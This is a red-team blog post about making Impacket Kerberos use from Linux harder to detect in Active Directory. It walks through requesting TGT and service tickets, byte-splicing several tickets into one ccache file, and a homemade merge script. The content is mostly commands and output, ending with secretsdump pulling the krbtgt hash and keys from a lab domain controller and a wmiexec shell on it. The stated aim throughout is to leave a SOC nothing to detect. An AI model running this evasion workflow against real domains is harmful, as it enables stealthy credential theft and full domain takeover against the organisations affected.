# Making Linux Kerberos Tickets Not Bad

# Outline

Small post about making kerberos ticket better from linux. Mainly focusing on opsec considerations and how to blend into normal traffic. Also going to modify an impacket script and write my own. I wont be covering the basics of kerberos or ADCS as its been done 100 times by people a lot better at writing blogs than I am (most of the stuff here will be covered in the links below): 


- Kerberos: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html

- For those that dont like reading: https://www.youtube.com/watch?v=byykEId3FUs&ab_channel=scrt.insomnihack


Things I’m going to cover.

- Ticket flow when using impacket (and how to make it not sus)

- Multiple tickets in one ccache file

# Ticket Flow When Using Impacket

So lets say you have a high privileged account in AD, Domain admin or a service account running as a DA or something. So you start to run psexec to login to boxes and grab stuff, secretsdump to dump hashes from the domain, creating a user account as a domain admin to flex in the report. What does impacket actually do when you do this?


Quick assumptions - You have the plain text pwd, ntlm hash and aes256 key (random but it’ll be used later)


Every time you run a script specifying kerberos and passing in a TGT impacket with use this TGT to request a TGS, for wmiexec it will request a CIFS ticket, then a HOST ticket four times. This is because impacket is not saving the ticket in memory and requesting a new one everytime.


```bash
KRB5CCNAME=$(pwd)/Administrator.ccache wmiexec.py runeterra.local/Administrator@dc01 -k -no-pass -debug
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/eljay/.local/lib/python3.9/site-packages/impacket
[+] Using Kerberos Cache: /home/eljay/Administrator.ccache
[+] SPN CIFS/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/RUNETERRA.LOCAL@RUNETERRA.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at RUNETERRA.LOCAL:88
[*] SMBv3.0 dialect used
[+] Using Kerberos Cache: /home/eljay/Administrator.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/RUNETERRA.LOCAL@RUNETERRA.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at RUNETERRA.LOCAL:88
[+] Target system is dc01 and isFQDN is True
[+] StringBinding: DC01[50601]
[+] StringBinding chosen: ncacn_ip_tcp:DC01[50601]
[+] Using Kerberos Cache: /home/eljay/Administrator.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/RUNETERRA.LOCAL@RUNETERRA.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at RUNETERRA.LOCAL:88
[+] Using Kerberos Cache: /home/eljay/Administrator.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/RUNETERRA.LOCAL@RUNETERRA.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at RUNETERRA.LOCAL:88
[+] Using Kerberos Cache: /home/eljay/Administrator.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/RUNETERRA.LOCAL@RUNETERRA.LOCAL
[+] Using TGT from cache
[+] Trying to connect to KDC at RUNETERRA.LOCAL:88
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>exit
```


This is strange in the context of a normal user doing normal user stuff, as in windows the tickets would be stored within the LUID. So the first time a TGT is requested it will be saved and used to request a TGS which will be also be saved in the LUID. When connecting to the service Windows will provide all the needed TGS tickets (or create new ones by providing the TGT). To mimic this on Linux we have to first request a TGT then request the TGS tickets and save them all to one file. 

# Multiple Tickets In One Ccache File.

You will soon come to realise that this is harder then it seems. If you request a CIFS ticket then pass that it makes it a bit better, but will instead change the SPN of the CIFS ticket to be a HOST ticket and use that in memory. (It will also request it multiple times).
Requesting the CIFS ticket from the TGT, and validating it:


```bash
$ KRB5CCNAME=$(pwd)/Administrator-TGT.ccache getST.py runeterra.local/Administrator -k -no-pass -spn CIFS/dc01
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting ST for user
[*] Saving ticket in Administrator.ccache

$ mv Administrator.ccache Administrator-CIFS.ccache

$ klist -c Administrator-CIFS.ccache 
Ticket cache: FILE:Administrator-CIFS.ccache
Default principal: Administrator@RUNETERRA.LOCAL

Valid starting     Expires            Service principal
18/12/23 03:32:46  18/12/23 13:31:55  CIFS/dc01@RUNETERRA.LOCAL
	renew until 19/12/23 03:31:55
```

Then using this ticket for wmiexec.py:

```bash
KRB5CCNAME=$(pwd)/Administrator-CIFS.ccache wmiexec.py runeterra.local/Administrator@dc01 -k -no-pass -debug
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/eljay/.local/lib/python3.9/site-packages/impacket
[+] Using Kerberos Cache: /home/eljay/Administrator-CIFS.ccache
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[*] SMBv3.0 dialect used
[+] Using Kerberos Cache: /home/eljay/Administrator-CIFS.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01@RUNETERRA.LOCAL to HOST/DC01@RUNETERRA.LOCAL and hoping for the best
[+] Target system is dc01 and isFQDN is True
[+] StringBinding: DC01[50601]
[+] StringBinding chosen: ncacn_ip_tcp:DC01[50601]
[+] Using Kerberos Cache: /home/eljay/Administrator-CIFS.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01@RUNETERRA.LOCAL to HOST/DC01@RUNETERRA.LOCAL and hoping for the best
[+] Using Kerberos Cache: /home/eljay/Administrator-CIFS.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01@RUNETERRA.LOCAL to HOST/DC01@RUNETERRA.LOCAL and hoping for the best
[+] Using Kerberos Cache: /home/eljay/Administrator-CIFS.ccache
[+] SPN HOST/DC01@RUNETERRA.LOCAL not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01@RUNETERRA.LOCAL to HOST/DC01@RUNETERRA.LOCAL and hoping for the best
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>exit
```


This is a bit better, but still weird from the logs. As it would show that the user requested a TGT then a CIFS TGS then authenticated with a HOST ticket, that just appeared out of nowhere. Will a SOC be monitoring this? maybe idk I’m not a SOC Analyst, but if they are lets get rid of that and do it properly.


One possible way around this is to request the HOST ticket but not use it in the ccache. This will stop the “It appeared out of nowhere” detection chance, but I still don’t like it as the ticket generation time will be different. I want to give the SOC absolutely nothing to detect on. :D


Lets dive into the ccache structure and see if we can inject a second TGS.


https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html

```bash
A credential cache (or “ccache”) holds Kerberos credentials while they remain valid
```


credentials, plural meaning multiple. (please dont be a typo) So it is doable!


Going back to the structure of a TGS it will have a bunch of header stuff and then the actual TGS as shown here: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication


The structure will be: Username, Session Key encrypted stuff then TGS. So if we can extract out just the TGS and slap it onto the end of the ccache file it should be fine?


So how do we find the length of this header vaule?


I used impacket’s [ccache.py](http://ccache.py) file cause that seemed like a good place to start, and checked the length of the ticket before and after the header is passed out. For both the TGT and CIFS tickets the difference is 60 (This will change based on the length of the SPN and client).


So cutting off the first 60bytes and pray for the best.

```bash
$ dd if=Administrator-HOST.ccache of=Administrator-HOST-stripped.ccache bs=1 skip=60
1286+0 records in
1286+0 records out
1286 bytes (1.3 kB, 1.3 KiB) copied, 0.00494448 s, 260 kB/s
$ cp Administrator-CIFS.ccache Administrator-MULT.ccache
$ cat Administrator-HOST-stripped.ccache >> Administrator-MULT.ccache
$ klist -c Administrator-MULT.ccache 
Ticket cache: FILE:Administrator-MULT.ccache
Default principal: Administrator@RUNETERRA.LOCAL

Valid starting     Expires            Service principal
18/12/23 03:36:57  18/12/23 13:31:55  CIFS/dc01@RUNETERRA.LOCAL
	renew until 19/12/23 03:31:55
18/12/23 04:00:29  18/12/23 13:31:55  HOST/dc01@RUNETERRA.LOCAL
	renew until 19/12/23 03:31:55
```


Lol it worked.


```bash
$ KRB5CCNAME=$(pwd)/Administrator-MULT.ccache wmiexec.py runeterra.local/Administrator@dc01 -k -no-pass -debug
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/eljay/.local/lib/python3.9/site-packages/impacket
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[*] SMBv3.0 dialect used
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Target system is dc01 and isFQDN is True
[+] StringBinding: DC01[50601]
[+] StringBinding chosen: ncacn_ip_tcp:DC01[50601]
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>exit
```

# mergeTicket.py

Time to write an impacket script to merge tickets for us! (I dont think this has already been done)


To start with I’m going to pass in 2 tickets and check if the spn is different, username is the same and if its for the same server.

```bash
$ ./mergeTicket.py CIFS.ccache HOST.ccache -o merged.ccache
Impacket v0.11.0 - Copyright 2023 Fortra

[*] User Name                     : administrator
[*] Hostname                      : WIN-O4PO3OJQGBU.runeterra.local
[*] Service Of Ticket 1           : CIFS
[*] Service Of Ticket 2           : HOST
```


Next is to just merge the tickets. I’m going to use the crude way of just reading in 60 bytes then writing it out to a file.

```bash
./mergeTicket.py CIFS.ccache HOST.ccache -o new.ccache
Impacket v0.11.0 - Copyright 2023 Fortra

[*] User Name                     : administrator
[*] Hostname                      : WIN-O4PO3OJQGBU.runeterra.local
[*] Service Of Ticket 1           : CIFS
[*] Service Of Ticket 2           : HOST
[*] Writing to output file: new.ccache
[*] Done!
```

```bash
klist -c new.ccache 
Ticket cache: FILE:new.ccache
Default principal: administrator@RUNETERRA.LOCAL

Valid starting     Expires            Service principal
09/12/23 06:58:18  09/12/23 16:58:18  CIFS/WIN-O4PO3OJQGBU.runeterra.local@RUNETERRA.LOCAL
	renew until 10/12/23 06:58:18
09/12/23 06:57:41  09/12/23 16:57:41  HOST/WIN-O4PO3OJQGBU.runeterra.local@RUNETERRA.LOCAL
	renew until 10/12/23 06:57:42
```


Nice! it works.


Now to update the script to work for any number of tickets.

```bash
$ ticket/mergeTicket.py Administrator-HOST.ccache Administrator-CIFS.ccache  Administrator-LDAP.ccache -o output.ccache
Impacket v0.11.0 - Copyright 2023 Fortra

[*] User Name                     : Administrator
[*] Hostname                      : dc01
[*] Service Of Ticket 1           : HOST
[*] Service Of Ticket 2           : CIFS
[*] Service Of Ticket 3           : LDAP
[*] Writing to output file: output.ccache
[*] Done!
```


And proof it works:


```bash
$ klist -c output.ccache 
Ticket cache: FILE:output.ccache
Default principal: Administrator@RUNETERRA.LOCAL

Valid starting     Expires            Service principal
18/12/23 04:00:29  18/12/23 13:31:55  HOST/dc01@RUNETERRA.LOCAL
	renew until 19/12/23 03:31:55
18/12/23 03:36:57  18/12/23 13:31:55  CIFS/dc01@RUNETERRA.LOCAL
	renew until 19/12/23 03:31:55
18/12/23 05:59:17  18/12/23 13:31:55  LDAP/dc01@RUNETERRA.LOCAL
	renew until 19/12/23 03:31:55
```


Here is the script if you want to laugh at my python code (or use the script): https://github.com/ElJayRight/impacket/blob/master/examples/mergeTicket.py


A final show of the new workflow with the new script:


1. Request a TGT:

```bash
$ getTGT.py runeterra.local/Administrator:Password123#
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in Administrator.ccache
$ mv Administrator.ccache Administrator-TGT.ccache
```

2. Request LDAP, HOST and CIFS tickets

```bash
KRB5CCNAME=$(pwd)/Administrator-TGT.ccache getST.py runeterra.local/Administrator -k -no-pass -spn LDAP/dc01
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting ST for user
[*] Saving ticket in Administrator.ccache
$ mv Administrator.ccache Administrator-LDAP.ccache

$ KRB5CCNAME=$(pwd)/Administrator-TGT.ccache getST.py runeterra.local/Administrator -k -no-pass -spn HOST/dc01
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting ST for user
[*] Saving ticket in Administrator.ccache

$ mv Administrator.ccache Administrator-HOST.ccache
$ KRB5CCNAME=$(pwd)/Administrator-TGT.ccache getST.py runeterra.local/Administrator -k -no-pass -spn CIFS/dc01
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting ST for user
[*] Saving ticket in Administrator.ccache

$ mv Administrator.ccache Administrator-CIFS.ccache
```

3. Merge the tickets.

```bash
$ /opt/impacket/examples/mergeTicket.py Administrator-CIFS.ccache Administrator-HOST.ccache Administrator-LDAP.ccache -o Administrator-MULT.ccache
Impacket v0.11.0 - Copyright 2023 Fortra

[*] User Name                     : Administrator
[*] Hostname                      : dc01
[*] Service Of Ticket 1           : CIFS
[*] Service Of Ticket 2           : HOST
[*] Service Of Ticket 3           : LDAP
[*] Writing to output file: Administrator-MULT.ccache
[*] Done!
```

Then run secretsdump (ldap) and wmiexec (cifs and host):

```bash
$ KRB5CCNAME=$(pwd)/Administrator-MULT.ccache secretsdump.py runeterra.local/Administrator@dc01 -k -no-pass -debug -just-dc-user krbtgt
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/eljay/.local/lib/python3.9/site-packages/impacket
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for krbtgt 
[+] Calling DRSGetNCChanges for {78716127-1372-498f-a077-2b2bb223b438} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=Runeterra,DC=local
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9aa143f112ca59f64ef9ee228d0b1756:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9fc4adf5d76a2bf807132aebcb4ca467fcadaed1fee26e2b8b42ac63adc5f2bf
krbtgt:aes128-cts-hmac-sha1-96:b8f04af06ad169d76551a0de5e73a071
krbtgt:des-cbc-md5:8c5b3bf88c91da07
[*] Cleaning up...
```

```bash
KRB5CCNAME=$(pwd)/Administrator-MULT.ccache wmiexec.py runeterra.local/Administrator@dc01 -k -no-pass -debug 
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /home/eljay/.local/lib/python3.9/site-packages/impacket
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for CIFS/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[*] SMBv3.0 dialect used
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Target system is dc01 and isFQDN is True
[+] StringBinding: DC01[50601]
[+] StringBinding chosen: ncacn_ip_tcp:DC01[50601]
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[+] Using Kerberos Cache: /home/eljay/Administrator-MULT.ccache
[+] Returning cached credential for HOST/DC01@RUNETERRA.LOCAL
[+] Using TGS from cache
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
runeterra\administrator

C:\>hostname
DC01

C:\>exit
```

It works!!

# Fin

So I didnt end up modifing an impacket script, so thats to come soon. I’m planning on updating getST to allow for both multiple SPNs and to save to a single file.
There are still other opsec things to consider that I didnt mention. I’ll probs cover these in the second post.